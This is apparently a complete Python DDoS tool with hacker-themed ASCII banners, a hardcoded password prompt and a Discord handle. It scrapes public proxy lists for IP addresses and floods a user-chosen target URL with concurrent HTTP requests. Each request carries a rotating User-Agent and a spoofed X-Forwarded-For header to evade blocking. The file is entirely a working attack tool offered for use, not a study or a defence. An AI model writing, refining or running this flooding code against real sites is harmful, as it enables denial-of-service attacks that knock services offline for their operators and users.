import sys
import asyncio
import aiohttp
import random
import re
import itertools
import os
import time
from getpass import getpass

UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux i645 ) AppleWebKit/601.39 (KHTML, like Gecko) Chrome/52.0.1303.178 Safari/600",
    "Mozilla/5.0 (Windows; U; Windows NT 6.2; x64; en-US) AppleWebKit/603.16 (KHTML, like Gecko) Chrome/49.0.3596.149 Safari/602",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_12_8) AppleWebKit/537.8 (KHTML, like Gecko) Chrome/51.0.3447.202 Safari/533",
    "Mozilla/5.0 (U; Linux x86_64; en-US) AppleWebKit/535.12 (KHTML, like Gecko) Chrome/54.0.2790.274 Safari/601",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 7_5_1) AppleWebKit/534.29 (KHTML, like Gecko) Chrome/54.0.2941.340 Safari/602",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_4_2) AppleWebKit/602.18 (KHTML, like Gecko) Chrome/47.0.1755.159 Safari/600",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_6_4; like Mac OS X) AppleWebKit/601.29 (KHTML, like Gecko) Chrome/47.0.1661.149 Mobile Safari/536.4",
    "Mozilla/5.0 (Linux; Android 5.1; SM-G9350T Build/LMY47X) AppleWebKit/602.21 (KHTML, like Gecko) Chrome/50.0.1176.329 Mobile Safari/535.9",
    "Mozilla/5.0 (Linux; U; Android 6.0.1; HTC One M8 Build/MRA58K) AppleWebKit/600.36 (KHTML, like Gecko) Chrome/53.0.3363.154 Mobile Safari/537.2",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_8_3) Gecko/20100101 Firefox/50.7",
    "Mozilla/5.0 (U; Linux i671 x86_64) AppleWebKit/535.27 (KHTML, like Gecko) Chrome/54.0.1417.286 Safari/537",
    "Mozilla/5.0 (iPad; CPU iPad OS 9_4_4 like Mac OS X) AppleWebKit/536.12 (KHTML, like Gecko) Chrome/55.0.1687.155 Mobile Safari/600.8",
    "Mozilla/5.0 (Linux; Android 4.4.1; LG-V510 Build/KOT49I) AppleWebKit/535.28 (KHTML, like Gecko) Chrome/52.0.2705.296 Mobile Safari/602.9",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/54.0.2084.216 Safari/603.3 Edge/8.91691",
    "Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.0; WOW64; en-US Trident/7.0)",
]

ip_list_urls = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://geonode.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
]

class AttackThread:
    def __init__(self, target_url, num_requests):
        self.target_url = target_url
        self.num_requests = num_requests

    async def fetch_ip_addresses(self, url):
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url) as response:
                    text = await response.text()
                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                    return ip_addresses
            except Exception as e:
                print(f"Error fetching IP list from {url}: {e}")
                return []

    async def get_all_ips(self):
        tasks = [self.fetch_ip_addresses(url) for url in ip_list_urls]
        ip_lists = await asyncio.gather(*tasks)
        all_ips = [ip for sublist in ip_lists for ip in sublist]
        return all_ips

    async def send_request(self, session, ip_address):
        headers = {
            "User-Agent": random.choice(UserAgents),
            "X-Forwarded-For": ip_address
        }
        try:
            async with session.get(self.target_url, headers=headers) as response:
                print(f"fsociety@root {self.target_url} from IP: {ip_address} - Status: {response.status}")
        except Exception as e:
            print(f"Error sending request from IP: {ip_address} - {e}")

    async def attack(self):
        ip_list = await self.get_all_ips()
        if not ip_list:
            print("No IP addresses found. Exiting.")
            return
        ip_cycle = itertools.cycle(ip_list)
        async with aiohttp.ClientSession() as session:
            tasks = [self.send_request(session, next(ip_cycle)) for _ in range(self.num_requests)]
            await asyncio.gather(*tasks)

    def run(self):
        asyncio.run(self.attack())

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def animate_text(text, delay=0.03):
    for char in text:
        print(f"\033[95m{char}\033[0m", end='', flush=True)
        time.sleep(delay)
    print()

def show_welcome():
    clear_screen()

    fsociety_art = """
╭━━━┳╮╱╭┳━━━┳━╮╱╭┳━━━━┳╮╱╭┳━╮╭━┳━━━┳━━━┳━━━┳╮╭━╮
┃╭━╮┃┃╱┃┃╭━╮┃┃╰╮┃┃╭╮╭╮┃┃╱┃┃┃╰╯┃┃╭━╮┃╭━━┫╭━╮┃┃┃╭╯
┃┃╱┃┃┃╱┃┃┃╱┃┃╭╮╰╯┣╯┃┃╰┫┃╱┃┃╭╮╭╮┃╰━╯┃╰━━┫┃╱┃┃╰╯╯
┃┃╱┃┃┃╱┃┃╰━╯┃┃╰╮┃┃╱┃┃╱┃┃╱┃┃┃┃┃┃┃╭━━┫╭━━┫╰━╯┃╭╮┃
┃╰━╯┃╰━╯┃╭━╮┃┃╱┃┃┃╱┃┃╱┃╰━╯┃┃┃┃┃┃┃╱╱┃╰━━┫╭━╮┃┃┃╰╮
╰━━╮┣━━━┻╯╱╰┻╯╱╰━╯╱╰╯╱╰━━━┻╯╰╯╰┻╯╱╱╰━━━┻╯╱╰┻╯╰━╯
╱╱╱╰╯
"""

    for line in fsociety_art.split('\n'):
        animate_text(line, 0.005)

    print()
    animate_text("𝙎𝙄𝙁𝙍𝙀 𝙈𝙀𝙉𝙐", 0.05)
    print()

def show_main_menu():
    clear_screen()

    quantum_menu = """
░██████╗░██╗░░░██╗░█████╗░███╗░░██╗████████╗██╗░░░██╗███╗░░░███╗██████╗░███████╗░█████╗░██╗░░██╗
██╔═══██╗██║░░░██║██╔══██╗████╗░██║╚══██╔══╝██║░░░██║████╗░████║██╔══██╗██╔════╝██╔══██╗██║░██╔╝
██║██╗██║██║░░░██║███████║██╔██╗██║░░░██║░░░██║░░░██║██╔████╔██║██████╔╝█████╗░░███████║█████═╝░
╚██████╔╝██║░░░██║██╔══██║██║╚████║░░░██║░░░██║░░░██║██║╚██╔╝██║██╔═══╝░██╔══╝░░██╔══██║██╔═██╗░
░╚═██╔═╝░╚██████╔╝██║░░██║██║░╚███║░░░██║░░░╚██████╔╝██║░╚═╝░██║██║░░░░░███████╗██║░░██║██║░╚██╗
░░░╚═╝░░░░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝
"""

    for line in quantum_menu.split('\n'):
        animate_text(line, 0.005)

    print()
    animate_text("▄▀█ █▄░█ ▄▀█   █▀▄▀█ █▀▀ █▄░█ █░█", 0.02)
    animate_text("█▀█ █░▀█ █▀█   █░▀░█ ██▄ █░▀█ █▄█", 0.02)
    print()

def check_password():
    max_attempts = 3
    for attempt in range(max_attempts):
        password = getpass("\033[95mEnter Password: \033[0m")
        if password == "986":
            return True
        else:
            print(f"\033[91mWrong password! {max_attempts - attempt - 1} attempts remaining.\033[0m")

    print("\033[91mToo many failed attempts. Exiting.\033[0m")
    return False

def main():
    show_welcome()

    if not check_password():
        return

    show_main_menu()

    print("DISCORD: quantumpeak")
    print("-------------------------")
    target_url = input("Enter Target URL (e.g., https://example.com): ").strip()
    try:
        num_requests = int(input("Enter Number of Requests: ").strip())
        if num_requests <= 0:
            raise ValueError
    except ValueError:
        print("Error: Number of requests must be a positive integer.")
        return

    if not target_url:
        print("Error: Please provide a valid URL.")
        return

    print("DDoS started.")
    attack_thread = AttackThread(target_url, num_requests)
    try:
        attack_thread.run()
    except KeyboardInterrupt:
        print("\nDDoS stopped by user.")

if __name__ == "__main__":
    main()
